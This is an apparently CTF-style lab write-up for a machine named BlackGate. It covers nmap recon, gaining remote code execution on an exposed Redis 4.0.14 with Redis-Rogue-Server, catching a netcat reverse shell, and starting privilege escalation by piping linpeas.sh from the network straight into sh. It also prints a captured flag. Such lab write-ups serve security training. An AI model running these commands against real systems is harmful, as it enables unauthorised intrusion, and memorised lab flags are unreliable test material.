## NMAP

```nmap-tcp
??$ nmap -sC -sV -p- $TARGET -oA BlackGate
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 15:24 UTC
Nmap scan report for 192.168.55.176
Host is up (0.0066s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
|_  256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
6379/tcp open  redis   Redis key-value store 4.0.14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.02 seconds
```

## REDIS

```nmap-script-redis
nmap --script redis-info -sV -p 6379 <IP>
```

```nmap-redis-result
??$ nmap --script redis-info -sV -p 6379 $TARGET
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-10 15:27 UTC
Nmap scan report for 192.168.55.176
Host is up (0.00055s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.14 (64 bits)
| redis-info: 
|   Version: 4.0.14
|   Operating System: Linux 5.8.0-63-generic x86_64
|   Architecture: 64 bits
|   Process ID: 874
|   Used CPU (sys): 0.27
|   Used CPU (user): 0.09
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 882.46K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|   Client connections: 
|_    192.168.49.55

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.28 seconds
```

Used Redis-Rogue-Server to RCE

```redis-rogue-server
python redis-rogue-server.py --rhost $TARGET --lhost 192.168.49.55
```

```foothold
??$ nc -lvnp 9002 
listening on [any] 9002 ...
connect to [192.168.49.55] from (UNKNOWN) [192.168.55.176] 54536
ls
netplan_8djgn775
netplan_kxw2ml8n
snap.lxd
systemd-private-22dde99c416b4be58bd33ac673cd4e0b-systemd-logind.service-Fv0Zhh
systemd-private-22dde99c416b4be58bd33ac673cd4e0b-systemd-resolved.service-NybGZi
systemd-private-22dde99c416b4be58bd33ac673cd4e0b-systemd-timesyncd.service-QDlOJf
vmware-root_708-2998936538
whoami
prudence
```

```flag-local
0257fb0466c59122bb35de0541b0a271
```


## Privilege Escalation

```terminal-setup
python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm-256color
```


```linpeas
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Needs ROP and Reverse Engineering.......